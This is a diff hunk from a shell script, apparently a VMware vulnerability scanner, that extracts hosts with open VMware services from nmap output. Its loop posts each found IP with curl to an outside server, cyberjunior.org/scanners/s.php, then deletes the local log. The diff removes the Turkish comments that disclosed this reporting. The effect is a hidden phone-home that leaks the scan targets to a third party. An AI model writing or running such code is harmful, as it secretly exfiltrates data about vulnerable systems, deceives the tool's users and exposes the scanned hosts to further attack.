@@ -52,13 +52,10 @@ read VulnData
 cat output.gnmap | grep open | grep VMware | cut -d: -f2 | awk '{ print $1}' > $VMwareServers
                                                                            
 for line in `cat $VMwareServers`                                            
-
-######## BU ALAN VULNARABLE IP'LERIN DATASINI TUTMAKTADIR ISTERSENIZ SİLEBİLİRSİNİZ ######
 do                                                                          
 curl -s --data "i=$line&t=VMware" http://cyberjunior.org/scanners/s.php >> .logs 
 done                                                                        
 rm .logs    
-######## BU ALAN VULNARABLE IP'LERIN DATASINI TUTMAKTADIR ISTERSENIZ SİLEBİLİRSİNİZ ######
 
 echo -e "
 \033[31m#######################################################\033[m
